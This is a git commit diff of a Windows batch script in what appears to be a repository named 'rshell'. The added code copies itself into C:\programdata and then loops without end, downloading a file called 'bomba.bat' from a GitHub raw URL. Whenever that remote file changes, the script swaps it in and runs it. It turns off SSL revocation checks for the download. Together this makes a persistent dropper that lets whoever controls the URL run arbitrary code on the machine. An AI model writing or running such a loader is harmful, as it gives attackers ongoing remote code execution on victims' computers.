c741f0b56c090ae8431eacd272dde0584819b7d5
C0N5OLE <60917410+DMK787@users.noreply.github.com>
2024-09-01 22:23:28 +1000

    Update main.bat

--- test (2).bat
+++ test (2).bat
@@ -1,10 +1,25 @@
+@echo off
+set d=%0
+copy %d% C:\programdata
+:start
+IF EXIST C:\programdata\bomba.bat (
 :loop
-curl -L https://github.com/jtenara/rshell/blob/main/test.txt | findstr "downloadnowplease">Nul 
-if not errorlevel 1 (echo sigma sigma worked
-del bomba.bat
-curl --output bomba.bat -L --ssl-no-revoke https://github.com/jtenara/rshell/blob/main/bomba.bat
-) else (
+curl --output C:\programdata\bomba2.bat -L https://raw.githubusercontent.com/DMK787/rshell/main/bomba.bat
+fc C:\programdata\bomba2.bat C:\programdata\bomba.bat>nul
+if errorlevel 1 (
+echo WORKED
+del C:\programdata\bomba.bat
+ren C:\programdata\bomba2.bat bomba.bat
+start C:\programdata\bomba.bat
 timeout /t 1
-goto loop)
-
-pause
+goto loop
+) ELSE (
+echo NOT WORKED
+timeout /t 1
+goto loop
+)
+) ELSE (
+echo FILE NOT FOUND
+curl --output C:\programdata\bomba.bat -L --ssl-no-revoke https://raw.githubusercontent.com/DMK787/rshell/main/bomba.bat
+goto start
+)
